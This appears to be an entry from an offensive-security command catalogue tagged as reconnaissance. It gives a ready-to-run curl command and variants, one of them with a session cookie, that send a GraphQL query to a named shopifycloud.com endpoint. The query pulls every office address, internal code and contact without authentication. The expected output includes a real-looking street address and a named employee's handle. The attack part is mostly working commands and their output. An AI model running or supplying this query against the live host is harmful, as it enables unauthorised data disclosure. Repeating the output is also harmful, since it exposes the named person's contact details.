---
data: >-
  curl -X POST https://beerify.shopifycloud.com/graphql -H "Content-Type:
  application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;
  rv:62.0) Gecko/20100101 Firefox/62.0" -d '{"query": "query
  allLocations{allLocations{address, code, contact}}"}'
tags:
  - graphql
  - recon
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 0a718dd9-3090-4946-9134-d7e17f87ddbc
created_at: '2025-12-14T17:25:59.602Z'
updated_at: '2025-12-14T17:25:59.602Z'
verified: false
validated: true
submitted: true
---
# graphql-query-locations

## Command

```bash
curl -X POST https://beerify.shopifycloud.com/graphql -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0" -d '{"query": "query allLocations{allLocations{address, code, contact}}"}'
```

## Description

This command sends a GraphQL POST request to query all office locations, disclosing addresses, codes, and contacts without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON body type | Yes |
| `-d` | Query payload | Yes |
| `query` | GraphQL query string | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://beerify.shopifycloud.com/graphql -H "Content-Type: application/json" -d '{"query": "query allLocations{allLocations{address, code, contact}}"}'
```

### Advanced Usage

```bash
curl -X POST https://beerify.shopifycloud.com/graphql -H "Content-Type: application/json" -H "Cookie: _y=..." -d '{"query": "query allLocations{allLocations{address, code, contact}}"}'
```

## Expected Output

JSON response with data: {"data":{"allLocations":[{"address":"150 Elgin Street, Ottawa, ON, Canada, K2P1L4","code":"OTT150, 8th Floor","contact":"Alana Plomp (@alana.plomp)"}]}}.

## Related

- [[Related Procedure]]
